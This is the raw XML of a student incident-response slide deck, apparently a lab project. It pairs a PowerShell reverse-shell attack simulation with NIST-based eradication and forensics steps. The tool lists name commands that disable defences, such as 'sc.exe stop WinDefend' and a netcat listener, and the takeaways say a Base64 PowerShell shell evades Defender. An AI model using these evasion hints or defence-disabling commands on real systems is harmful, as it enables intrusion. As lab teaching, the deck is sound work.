            <a:ext cx="5303520" cy="82296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612648" y="412394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813816" y="412394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1014984" y="412394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67512" y="4297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Get-FileHash -Path "&lt;payload_path&gt;" -Algorithm SHA256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3401568"/>
            <a:ext cx="5577840" cy="157276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B4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6281928" y="3631172"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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281928" y="3658181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0" y="351129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Delete the malicious executable permanently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09360" y="4041648"/>
            <a:ext cx="5303520" cy="82296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6419088" y="412394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6620256" y="412394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6821424" y="412394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473952" y="4297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del /F /Q "%USERPROFILE%\Downloads\SecurityUpdate.exe"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5760" y="5138928"/>
            <a:ext cx="5577840" cy="157276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B4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474853" y="5312156"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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74853" y="5367794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1560" y="524865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Audit registry AutoRun keys for persistence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2920" y="5779008"/>
            <a:ext cx="5303520" cy="82296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612648" y="586130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813816" y="586130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1014984" y="586130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67512" y="6035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reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run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72200" y="5138928"/>
            <a:ext cx="5577840" cy="1572768"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244"/>
          </a:solidFill>
          <a:ln w="10160">
            <a:solidFill>
              <a:srgbClr val="B4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6318504" y="5330952"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B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318504" y="5358384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58000" y="524865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Remove malicious registry persistence entry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5779008"/>
            <a:ext cx="5303520" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 53333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="020818"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="008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6419088" y="586130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6620256" y="586130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6821424" y="586130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473952" y="6035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reg delete HKCU\...\CurrentVersion\Run /v &lt;KeyName&gt; /f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Recovery &amp; Post-Incident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Phases 4 &amp; 5  |  Steps 14 - 19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623560" cy="5376672"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 133333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="04181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56235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1298448"/>
            <a:ext cx="5623560" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="008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" y="1298448"/>
            <a:ext cx="55869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4 — Recovery  (Steps 14-16)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77440"/>
            <a:ext cx="438912" cy="43891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0299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 Offline AV / EDR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450592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comprehensive antivirus and EDR scan.
Verify no secondary backdoors or dropped artifacts remain on disk.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401568"/>
            <a:ext cx="5367174" cy="45720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="008CB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86968" y="4018788"/>
            <a:ext cx="438912" cy="43891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6968" y="40187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3896" y="367131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Re-enable Network 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6" y="4091940"/>
            <a:ext cx="40325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Enable-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NetAdapter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-Name "*"
Verify connectivity is fully restored and stable.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974336"/>
            <a:ext cx="5184648" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="008CB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453896" y="5449824"/>
            <a:ext cx="438912" cy="43891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53896" y="5449824"/>
            <a:ext cx="43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0824" y="5102352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Monitor System for 24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0824" y="5522976"/>
            <a:ext cx="32103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Watch network traffic continuously.
Verify no beaconing to attacker C2. Confirm clean state.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1261872"/>
            <a:ext cx="5623560" cy="5376672"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 133333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="04180A"/>
          </a:solidFill>
          <a:ln w="1270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99632" y="1261872"/>
            <a:ext cx="5623560" cy="54864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99632" y="1298448"/>
            <a:ext cx="5623560" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666"/>
            </a:avLst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17920" y="1298448"/>
            <a:ext cx="55869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5 — Post-Incident  (Steps 17-19)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Oval 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6382512" y="2377440"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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82512" y="23774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0299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Detect Anti-Forensics (clearev module)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450592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Get-WinEvent @{LogName='System'; ID=104}
Get-WinEvent @{LogName='Security'; ID=1102}
Looks for attacker-cleared event logs.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7346" y="3401567"/>
            <a:ext cx="5478633" cy="45719"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00A85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821424" y="3950208"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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21424" y="395020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8352" y="360273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Audit Authentication Event Logs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8352" y="402336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Event ID 4624 — Successful logon
Event ID 4672 — Special privileges assigned
Detect unauthorized access &amp; token impersonation.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4942226"/>
            <a:ext cx="5257800" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00A85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315554" y="5440893"/>
            <a:ext cx="438912" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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315554" y="5440893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482" y="509342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Compile Full IR Report &amp; Timeline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482" y="5514045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Document: attack vector, IoCs (SHA256 hashes),
mitigation steps taken, forensic timeline.
Submit as DEPI final project deliverable.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7432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78992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883664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2688336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493008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29768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102352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07024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711696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16368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321040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125712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9930384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0735056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1539728" y="5303520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74320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78992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883664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2688336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3493008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297680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102352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5907024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11696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516368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321040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9125712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930384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0735056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1539728" y="6108192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74320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078992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883664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2688336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3493008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297680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5102352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07024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6711696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7516368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8321040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9125712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9930384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10735056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1539728" y="6912864"/>
            <a:ext cx="54864" cy="54864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TOOLS &amp; TECHNOLOGIES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Everything We Used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1261872"/>
            <a:ext cx="4572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65760" y="1444752"/>
            <a:ext cx="2724912" cy="5193792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65760" y="1444752"/>
            <a:ext cx="2724912" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="rect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65760" y="1481328"/>
            <a:ext cx="2724912" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666"/>
            </a:avLst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65760" y="1481328"/>
            <a:ext cx="2724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ATTACK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" y="2121408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640080" y="2267712"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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14400" y="2240280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Kali Linux 2024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0352" y="2871215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640080" y="3017520"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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14400" y="2990088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Metasploit Framework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0352" y="3621024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40080" y="3767328"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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14400" y="3739896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msfvenom (payload gen)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" y="4370831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40080" y="4517136"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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14400" y="4489704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Netcat  nc -lvnp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0352" y="5120640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40080" y="5266944"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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14400" y="5239512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Nmap  -sV -T4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0352" y="5870448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640080" y="6016752"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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14400" y="5989320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Python HTTP Server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337560" y="1444752"/>
            <a:ext cx="2724912" cy="5193792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337560" y="1444752"/>
            <a:ext cx="2724912" cy="54864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3337560" y="1481328"/>
            <a:ext cx="2724912" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666"/>
            </a:avLst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337560" y="1481328"/>
            <a:ext cx="2724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LAB PREP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02152" y="2121408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3611879" y="2267712"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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886200" y="2240280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windows_lab_prep.bat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02152" y="2871215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3611879" y="3017520"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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86200" y="2990088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netsh advfirewall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02152" y="3621024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3611879" y="3767328"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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886200" y="3739896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Set-MpPreference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02152" y="4370831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3611879" y="4517136"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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886200" y="4489704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sc.exe stop WinDefend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502152" y="5120640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3611879" y="5266944"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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886200" y="5239512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 add (registry)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02152" y="5870448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611879" y="6016752"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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886200" y="5989320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Set-ExecutionPolicy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09360" y="1444752"/>
            <a:ext cx="2724912" cy="5193792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6309360" y="1444752"/>
            <a:ext cx="272491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6309360" y="1481328"/>
            <a:ext cx="2724912" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666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6309360" y="1481328"/>
            <a:ext cx="2724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IR STEPS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73952" y="2121408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6583680" y="2267712"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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858000" y="2240280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netstat -ano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73952" y="2871215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6583680" y="3017520"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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858000" y="2990088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tasklist / taskkill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473952" y="3621024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6583680" y="3767328"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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858000" y="3739896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wmic process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473952" y="4370831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6583680" y="4517136"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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6858000" y="4489704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Get-CimInstance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73952" y="5120640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6583680" y="5266944"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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858000" y="5239512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Disable-NetAdapter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73952" y="5870448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6583680" y="6016752"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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858000" y="5989320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Get-FileHash SHA256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281160" y="1444752"/>
            <a:ext cx="2724912" cy="5193792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270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9281160" y="1444752"/>
            <a:ext cx="2724912" cy="54864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9281160" y="1481328"/>
            <a:ext cx="2724912" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 106666"/>
            </a:avLst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9281160" y="1481328"/>
            <a:ext cx="2724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FORENSICS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445752" y="2121408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9555480" y="2267712"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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9829800" y="2240280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Windows Event Viewer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445752" y="2871215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9555480" y="3017520"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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9829800" y="2990088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ir_investigation.ps1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445752" y="3621024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9555480" y="3767328"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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9829800" y="3739896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Event ID 4624 / 4672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445752" y="4370831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9555480" y="4517136"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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9829800" y="4489704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Event ID 1102 / 104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445752" y="5120640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9555480" y="5266944"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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9829800" y="5239512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Get-WinEvent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445752" y="5870448"/>
            <a:ext cx="2395728" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="081228"/>
          </a:solidFill>
          <a:ln w="508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9555480" y="6016752"/>
            <a:ext cx="201168" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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9829800" y="5989320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 query / delete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78992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883664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2688336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493008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297680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102352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07024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711696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16368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321040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125712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9930384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0735056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1539728" y="5669280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74320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78992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883664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2688336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3493008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297680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102352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5907024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11696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516368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321040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9125712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930384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0735056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1539728" y="6473952"/>
            <a:ext cx="54864" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD7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058400" y="45720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0378440" y="45720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0698480" y="45720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1018520" y="45720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1338560" y="45720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058400" y="77724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0378440" y="77724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0698480" y="77724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11018520" y="77724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1338560" y="77724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10058400" y="109728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0378440" y="109728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0698480" y="109728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11018520" y="109728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1338560" y="109728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10058400" y="141731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10378440" y="141731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10698480" y="141731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1018520" y="141731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11338560" y="141731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10058400" y="173736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10378440" y="173736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10698480" y="173736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11018520" y="173736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11338560" y="173736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10058400" y="205740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10378440" y="205740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0698480" y="205740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11018520" y="205740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11338560" y="2057400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10058400" y="237743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10378440" y="237743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10698480" y="237743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11018520" y="237743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1338560" y="237743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10058400" y="269747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0378440" y="269747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10698480" y="269747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11018520" y="269747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11338560" y="2697479"/>
            <a:ext cx="54864" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD7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TAKEAWAYS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We Learned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1261872"/>
            <a:ext cx="4572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365760" y="1481328"/>
            <a:ext cx="5577840" cy="2304288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524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65760" y="1481328"/>
            <a:ext cx="5577840" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="rect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48640" y="1645920"/>
            <a:ext cx="5212080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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40080" y="164592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300" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="FF3D57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    </a:t>
            </a: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3D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ATTACK SIMULATION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2167128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Successfully delivered PowerShell reverse shell from Kali Linux to Windows 10 via social engineering. No EXE file required — bypasses Defender detection entirely using Base64-encoded PS one-liner.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1481328"/>
            <a:ext cx="5577840" cy="2304288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6172200" y="1481328"/>
            <a:ext cx="55778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6355080" y="1645920"/>
            <a:ext cx="5212080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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446520" y="164592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3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   </a:t>
            </a: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5-PHASE IR PLAN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55080" y="2167128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Applied NIST SP 800-61 framework end-to-end: Identification -&gt; Containment -&gt; Eradication -&gt; Recovery -&gt; Post-Incident. All 19 steps documented with exact commands.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3968496"/>
            <a:ext cx="5577840" cy="2304288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5240"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365760" y="3968496"/>
            <a:ext cx="5577840" cy="54864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48640" y="4133087"/>
            <a:ext cx="5212080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E57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40080" y="4133087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300" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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   </a:t>
            </a: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FORENSIC EVIDENCE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8640" y="4654296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Collected SHA256 hashes as IoCs. Audited Windows Event IDs 4624/4672 (auth) and 1102/104 (log clearing). Compiled full attack-to-recovery forensic timeline.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72200" y="3968496"/>
            <a:ext cx="5577840" cy="2304288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6172200" y="3968496"/>
            <a:ext cx="557784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6355080" y="4133087"/>
            <a:ext cx="5212080" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 66666"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD70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446520" y="4133087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300" b="1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t>   </a:t>
            </a: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LESSONS LEARNED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55080" y="4654296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PowerShell reverse shells — not EXE. Disable Defender and verify exclusions before testing. Always confirm payload size before execution. Document everything for the IR report.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660196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Digital Egypt Pioneers Initiative  |  Incident Response Project  |  Team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4037076" y="1371600"/>
            <a:ext cx="4114800" cy="41148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4631436" y="1965960"/>
            <a:ext cx="2926080" cy="292608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5180076" y="2514600"/>
            <a:ext cx="1828800" cy="1828800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34456" y="3268980"/>
            <a:ext cx="320040" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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-1828800" y="-1828800"/>
            <a:ext cx="7315200" cy="6400800"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00508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8229600" y="2743200"/>
            <a:ext cx="6400800" cy="5943600"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="005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572000" y="-1371600"/>
            <a:ext cx="4572000" cy="3657600"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00306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74320" y="8229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4359" y="8229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14400" y="8229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234439" y="8229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274320" y="114300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94359" y="114300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14400" y="114300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234439" y="114300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274320" y="146304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594359" y="146304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14400" y="146304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234439" y="146304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274320" y="17830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94359" y="17830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14400" y="17830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234439" y="17830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274320" y="21031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594359" y="21031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14400" y="21031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234439" y="21031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274320" y="24231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94359" y="24231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14400" y="24231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234439" y="24231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274320" y="274319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594359" y="274319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914400" y="274319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234439" y="274319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274320" y="306323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94359" y="306323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914400" y="306323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234439" y="306323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274320" y="33832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94359" y="33832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914400" y="33832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1234439" y="33832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274320" y="37033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594359" y="37033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914400" y="37033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234439" y="37033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10241280" y="8229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10561319" y="8229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10881359" y="8229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11201400" y="8229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10241280" y="114300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10561319" y="114300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10881359" y="114300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11201400" y="114300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10241280" y="146304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10561319" y="146304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10881359" y="146304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11201400" y="146304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0241280" y="17830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10561319" y="17830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10881359" y="17830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11201400" y="17830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10241280" y="21031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10561319" y="21031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10881359" y="21031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1201400" y="21031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10241280" y="24231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0561319" y="24231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10881359" y="24231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11201400" y="242316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10241280" y="274319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10561319" y="274319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10881359" y="274319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11201400" y="274319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10241280" y="306323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10561319" y="306323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10881359" y="306323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11201400" y="306323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10241280" y="33832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10561319" y="33832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10881359" y="33832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11201400" y="3383279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10241280" y="37033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10561319" y="37033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10881359" y="37033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11201400" y="3703320"/>
            <a:ext cx="54864" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E5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72000" y="182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LIVE DEMONSTRATION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7315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NOW WE RUN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16459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00E5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LAB</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="Oval 93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5413248" y="2834640"/>
            <a:ext cx="1371600" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00E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57200" y="4617720"/>
            <a:ext cx="3639312" cy="1993392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524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640080" y="4773168"/>
            <a:ext cx="475488" cy="475488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40080" y="47731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61872" y="4736592"/>
            <a:ext cx="2724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windows_lab_prep.bat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61872" y="5166360"/>
            <a:ext cx="27249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as Admin on Windows 10
Disables Defender &amp; Firewall</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Oval 101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261872" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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1463039" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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1664207" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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1865376" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFA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4370832" y="4617720"/>
            <a:ext cx="3639312" cy="1993392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524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4553712" y="4773168"/>
            <a:ext cx="475488" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F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553712" y="47731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75504" y="4736592"/>
            <a:ext cx="2724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3D57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kali_attack.sh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175504" y="5166360"/>
            <a:ext cx="27249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as root on Kali Linux
Launches full automated attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Oval 111"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5175504" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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5376672" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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5577840" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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5779008" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF3D5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8284464" y="4617720"/>
            <a:ext cx="3639312" cy="1993392"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 133333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E2244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8467344" y="4773168"/>
            <a:ext cx="475488" cy="47548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8467344" y="47731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089136" y="4736592"/>
            <a:ext cx="2724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ir_investigation.ps1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089136" y="5166360"/>
            <a:ext cx="27249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as Admin on Windows 10
Collects all forensic artifacts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="122" name="Oval 121"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9089136" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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9290304" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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9491472" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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9692640" y="5897880"/>
            <a:ext cx="64008" cy="64008"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00D4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57200" y="660196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Follow the team task distribution — each pair executes their assigned steps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2266</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>391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Adham Banna</cp:lastModifiedBy>
  <cp:revision>7</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-01-27T09:14:16Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-03T10:57:10Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>